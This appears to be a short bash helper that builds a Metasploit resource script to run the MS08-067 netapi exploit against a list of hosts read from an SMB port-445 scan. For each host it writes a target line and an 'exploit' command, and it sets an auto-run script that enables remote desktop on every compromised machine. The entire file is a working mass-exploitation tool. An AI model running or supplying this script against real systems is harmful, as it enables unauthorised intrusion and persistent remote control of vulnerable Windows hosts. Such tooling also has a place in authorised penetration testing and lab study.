#!/bin/bash
# ms08_set.sh sets up an .rc script to exploit ms08_067_netapi on multiple hosts
# Usage: bash ms08_set.sh < hosts/445_scan.txt
# Use the resource script in msfconsole > resource [ms08067.rc]

echo "set AutoRunScript getgui -e" > ./rc/ms08067.rc
echo "use exploit/windows/smb/ms08_067_netapi" >> ./rc/ms08067.rc
echo "set ExitOnSession false" >> ./rc/ms08067.rc

while read -p "Set RHOST: " rhost; do
    echo "set RHOST $rhost" >> ./rc/ms08067.rc
    echo "exploit" >> ./rc/ms08067.rc
done
